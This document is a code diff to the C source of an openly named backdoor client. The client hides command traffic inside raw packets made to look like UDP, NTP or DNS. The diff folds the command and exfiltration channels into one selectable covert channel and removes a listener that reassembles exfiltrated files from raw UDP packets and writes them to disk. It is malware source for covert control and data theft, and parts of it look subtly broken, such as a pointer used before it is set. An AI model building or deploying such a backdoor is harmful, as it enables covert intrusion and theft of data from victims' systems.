@@ -14,16 +14,14 @@
 #include "inet.h"
 
 int closing;
-int com_chan;
-int xfl_chan;
+int channel;
 
-void backdoor_client(uint32 ipaddr, int dport, int cchan, int xchan)
+void backdoor_client(uint32 ipaddr, int dport, int chan)
 {
 	char command[MAX_LEN];
 	pthread_t list_thread;
 
-	com_chan = cchan;
-	xfl_chan = xchan;
+	channel = chan;
 
 	if (ipaddr == 0)
 		error("Invalid IP specified.");
@@ -69,7 +67,7 @@ void backdoor_client(uint32 ipaddr, int dport, int cchan, int xchan)
 				dst_port = PORT_NTP;
 
 				usleep(SLEEP_TIME);
-				_send(ipaddr, src_port, dst_port, CHAN_UDP);
+				_send(ipaddr, src_port, dst_port, channel);
 			}
 
 //			free(enc);
@@ -110,8 +108,19 @@ void *listen_thread(void *arg)
 		if (*ip != ipaddr)
 			continue;
 
-		// Step 3: dump data into buffer
-		ptr = (char *)(packet + IP_LEN);
+		// Step 3: Check Channel Type
+		switch(channel)
+		{
+			case CHAN_UDP:
+				ptr = (char *)(packet + UDP_SIG);
+				break;
+			case CHAN_NTP:
+				ptr = (char *)(packet + NTP_SIG);
+				break;
+			case CHAN_DNS:
+				ptr = (char *)(packet + DNS_SIG);
+				break;
+		}
 
 		// Step 4: check for signature
 		if (*ptr == SIGNTR)
@@ -176,78 +185,3 @@ int val_port(int port)
 		return 0;
 }
 
-void* exfil_listen(void *arg)
-{
-	int sock;
-	char buf[MAX_LEN];
-	int buf_len = 0;
-	uint32 ipaddr = *(uint32*)arg;
-
-	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-	if(sock < 0)
-		error("unable to open exfil raw socket");
-
-	while (!closing)
-	{
-		char packet[MAX_LEN];
-		char *ptr;
-		char *data;
-//		char *dec;
-		char type;
-		int  pack_len;
-		uint32 *ip;
-
-		pack_len = read(sock, &packet, MAX_LEN);
-
-		// Step 1: locate the payload portion of the packet
-		if (pack_len <= 0)
-			continue;
-
-		// Step 1: check IP address
-		ip = ((uint32*)packet) + 3;
-		if (*ip != ipaddr)
-			continue;
-
-		// Step 2: check for signature
-		if(*ptr == SIGNTR)
-			continue;
-
-		++ptr;
-
-		// Step 3: dump data into buffer
-		ptr = (char *)(packet + IP_LEN);
-//		dec = decrypt(SEKRET, ptr, FRAM_SZ);
-		data = buf + buf_len;
-		memcpy(data, ptr, FRAM_SZ);
-//		free(dec);
-
-		buf_len += pack_len - IP_LEN;
-
-		// Step 4: see if we have a full transmission
-		data = getTransmission(buf, &buf_len, &type);
-		if (data == NULL)
-			continue;
-
-		if (type == XFL_TYP)
-		{
-			char fname[MAX_LEN];
-			FILE* file;
-			uint64 timestamp;
-
-			timestamp = get_sec();
-			sprintf(fname, "%llX", timestamp);
-			file = open_file(fname, TRUE);
-
-			printf("%s", data);
-			fwrite(data, buf_len, 1, file);
-
-			fclose(file);
-		}
-
-		free(data);
-	}
-
-	close(sock);
-
-	return NULL;
-}
